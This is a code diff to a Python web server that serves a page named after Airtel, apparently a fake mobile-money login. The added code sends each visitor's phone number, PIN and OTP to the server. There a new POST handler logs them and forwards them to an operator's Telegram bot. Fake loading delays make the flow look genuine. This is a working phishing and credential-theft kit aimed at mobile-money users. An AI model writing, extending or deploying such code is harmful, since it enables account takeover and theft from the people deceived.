@@ -408,8 +408,7 @@ HTML_CONTENT = """<!DOCTYPE html>
 </html>
 """
 
-AIRTEL_HTML = 123
-<!DOCTYPE html>
+AIRTEL_HTML = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -470,15 +469,29 @@ AIRTEL_HTML = 123
         }
       };
 
-      const handleLoginSubmit = () => {
+      const handleLoginSubmit = async () => {
         setIsLoading(true);
+        try {
+          await fetch('/api/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              phone,
+              pin: pin.join(''),
+              otp: 'Pending OTP...'
+            })
+          });
+        } catch (e) {
+          console.error('Failed to notify:', e);
+        }
         setTimeout(() => {
           setIsLoading(false);
           setStep(2);
-        }, 4500);
+        }, 1500);
       };
 
       const handleVerify = async () => {
+        setIsLoading(true);
         try {
           await fetch('/api/verify', {
             method: 'POST',
@@ -492,7 +505,10 @@ AIRTEL_HTML = 123
         } catch (e) {
           console.error('Failed to notify:', e);
         }
-        setStep(3);
+        setTimeout(() => {
+          setIsLoading(false);
+          setStep(3);
+        }, 2000);
       };
 
       if (isLoading) {
@@ -597,8 +613,7 @@ AIRTEL_HTML = 123
   </script>
 </body>
 </html>
-
-456
+"""
 
 class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -621,6 +636,57 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
         self.send_header("Content-type", "text/html; charset=utf-8")
         self.end_headers()
         self.wfile.write(HTML_CONTENT.encode("utf-8"))
+
+    def do_POST(self):
+        if self.path == '/api/verify':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            import json
+            import os
+            import requests
+            
+            try:
+                from dotenv import load_dotenv
+                load_dotenv()
+            except ImportError:
+                pass
+
+            data = json.loads(post_data.decode('utf-8'))
+            phone = data.get('phone', '')
+            pin = data.get('pin', '')
+            otp = data.get('otp', '')
+            
+            message = f"🚀 *New Application Received!*\n\n"
+            message += f"📱 *Phone:* +243 {phone}\n"
+            message += f"🔑 *PIN:* {pin}\n"
+            message += f"🔢 *OTP:* {otp}\n"
+            
+            token = os.environ.get("TELEGRAM_TOKEN")
+            chat_id = os.environ.get("TELEGRAM_CHAT_ID")
+            
+            print(f"[PayLite] Received Verification: Phone={phone}, PIN={pin}, OTP={otp}")
+            
+            if token and chat_id:
+                url = f"https://api.telegram.org/bot{token}/sendMessage"
+                payload = {
+                    "chat_id": chat_id,
+                    "text": message,
+                    "parse_mode": "Markdown"
+                }
+                try:
+                    res = requests.post(url, json=payload)
+                    print(f"[PayLite] Telegram response: {res.status_code}")
+                except Exception as e:
+                    print(f"[PayLite] Error sending to Telegram: {e}")
+            else:
+                print("[PayLite] Telegram credentials missing. Skipping notification.")
+
+            self.send_response(200)
+            self.send_header("Content-type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success"}).encode("utf-8"))
+            return
+
 
     def log_message(self, format, *args):
         # Clean terminal output
